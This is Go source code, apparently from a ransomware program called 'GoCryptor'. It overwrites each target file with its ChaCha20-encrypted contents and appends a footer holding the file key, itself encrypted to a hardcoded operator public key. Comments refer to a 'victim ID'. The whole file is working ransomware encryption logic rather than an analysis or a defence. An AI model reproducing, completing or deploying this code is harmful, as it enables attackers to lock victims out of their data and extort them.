package main

import (
	"encoding/binary"
	"hash/crc32"
	"io/fs"
	"math/rand"
	"os"

	"golang.org/x/crypto/chacha20"
	"golang.org/x/crypto/curve25519"
)

var OperatorPubKey = [32]byte{67, 78, 117, 70, 95, 48, 99, 15, 164, 175, 205, 170, 153, 242, 42, 156, 14, 95, 64, 61, 53, 91, 45, 31, 249, 223, 126, 228, 151, 14, 167, 35}

var SmallDataPubKey = [32]byte{228, 146, 2, 131, 232, 4, 66, 231, 5, 189, 21, 177, 122, 31, 28, 192, 228, 95, 74, 152, 57, 150, 237, 254, 201, 234, 47, 69, 189, 73, 9, 20}

type EncryptedFileFooter struct {
	EncryptedSharedSecret [32]byte // encrypted by operator public key
	SharedSecretPublicKey [32]byte
	SharedSecretNonce     [24]byte
	FilePublicKey         [32]byte
	FileNonce             [24]byte
	EncryptedFileChecksum uint32
	FileMarker            uint32
}

// Curve25519 generating public key from private key
func generatePublicKey(privateKey [32]byte) [32]byte {
	var publicKey [32]byte
	curve25519.ScalarBaseMult(&publicKey, &privateKey)
	return publicKey
}

// generate a buffer with a set amount of random bytes
func generateRandomBuffer(n int) []byte {
	var result []byte
	for i := 0; i < n; i++ {
		result = append(result, byte(rand.Intn(0xff-0+1)))
	}
	return result
}

// Curve25519 generating shared secret
// Takes in private key -> public key
func generateSharedSecret(myPrivateKey [32]byte, theirPublicKey [32]byte) []byte {
	var sharedSecret [32]byte
	curve25519.ScalarMult(&sharedSecret, &myPrivateKey, &theirPublicKey)
	return sharedSecret[:]
}

// func curve25519Example() {
// 	myPrivateKey := [32]byte{191, 145, 93, 226, 52, 69, 63, 94, 153, 130, 232, 193, 74, 144, 81, 137, 132, 134, 145, 160, 130, 210, 154, 23, 221, 139, 188, 40, 59, 38, 146, 143}
// 	myPublicKey := generatePublicKey(myPrivateKey)
// 	fmt.Println("My private key: ", myPrivateKey)
// 	fmt.Println("My public key: ", myPublicKey)

// 	theirPrivateKey := [32]byte{63, 25, 33, 73, 88, 56, 26, 249, 232, 213, 30, 122, 35, 253, 225, 48, 148, 173, 229, 241, 29, 141, 170, 31, 37, 16, 158, 227, 75, 34, 153, 228}
// 	theirPublicKey := generatePublicKey(theirPrivateKey)
// 	fmt.Println("Their private key: ", theirPrivateKey)
// 	fmt.Println("Their public key: ", theirPublicKey)

// 	sharedSecret1 := generateSharedSecret(theirPrivateKey, myPublicKey)
// 	sharedSecret2 := generateSharedSecret(myPrivateKey, theirPublicKey)

// 	fmt.Println("Shared secret 1: ", sharedSecret1)
// 	fmt.Println("Shared secret 2: ", sharedSecret2)
// }

// CRC32 generating checksum for victim ID
func crc32Checksum(input []byte, polynomial uint32) uint32 {
	crc32q := crc32.MakeTable(polynomial)
	return crc32.Checksum(input, crc32q)
}

func chacha20Encryptor(input []byte, key []byte, nonce []byte) ([]byte, error) {
	chacha20Cipher, err := chacha20.NewUnauthenticatedCipher(key, nonce)

	if err != nil {
		return nil, err
	}
	var output []byte = make([]byte, len(input))
	chacha20Cipher.XORKeyStream(output, input)
	return output, nil
}

func encryptFileFull(filePath string, fileInfo fs.FileInfo) {
	var filePrivateKey [32]byte
	copy(filePrivateKey[:], generateRandomBuffer(32))
	filePublicKey := generatePublicKey(filePrivateKey)

	// fmt.Println("!!!!!!!!!!!!", GoCryptorConfig.campaignKey)
	sharedSecret := generateSharedSecret(filePrivateKey, GoCryptorConfig.campaignKey)

	// fmt.Println("Private key: ", filePrivateKey)
	// fmt.Println("Public key: ", filePublicKey, len(filePublicKey))
	// fmt.Println("Shared secret: ", sharedSecret, len(sharedSecret))

	fileNonce := generateRandomBuffer(24)
	// fmt.Println("Nonce: ", fileNonce, len(fileNonce))

	fileBuffer, _ := os.ReadFile(filePath)
	// fmt.Println("Buffer: ", len(fileBuffer))

	encryptedFileBytes, _ := chacha20Encryptor(fileBuffer, sharedSecret, fileNonce) // TODO: Make this safer

	file, _ := os.Create(filePath)
	defer file.Close()

	file.Write(encryptedFileBytes)
	fileFooter := encodeToBytes(populateFileFooter(sharedSecret, filePublicKey[:], fileNonce, crc32Checksum(encryptedFileBytes, 0xBEEFCAFE)))
	fileFooterLength := make([]byte, 4)
	binary.LittleEndian.PutUint32(fileFooterLength, uint32(len(fileFooter)))
	fileFooter = append(fileFooter, fileFooterLength...)
	file.Write(fileFooter)
}

func populateFileFooter(sharedSecret []byte, filePublicKey []byte, fileNonce []byte, encryptedFileChecksum uint32) EncryptedFileFooter {
	fileFooter := EncryptedFileFooter{}
	fileFooter.FilePublicKey = [32]byte{}
	copy(fileFooter.FilePublicKey[:], filePublicKey) // Potential overflow
	fileFooter.FileNonce = [24]byte{}
	copy(fileFooter.FileNonce[:], fileNonce) // Potential overflow
	fileFooter.EncryptedFileChecksum = encryptedFileChecksum

	var privateKey [32]byte
	copy(privateKey[:], generateRandomBuffer(32))
	publicKey := generatePublicKey(privateKey)
	fileFooter.SharedSecretPublicKey = publicKey
	newSharedSecret := generateSharedSecret(privateKey, OperatorPubKey)
	nonce := generateRandomBuffer(24)
	encryptedSharedSecret, _ := chacha20Encryptor(sharedSecret[:], newSharedSecret, nonce)
	fileFooter.EncryptedSharedSecret = [32]byte{}
	copy(fileFooter.EncryptedSharedSecret[:], encryptedSharedSecret)
	fileFooter.SharedSecretNonce = [24]byte{}
	copy(fileFooter.SharedSecretNonce[:], nonce)
	fileFooter.FileMarker = 0xCAFEDEAD
	return fileFooter
}
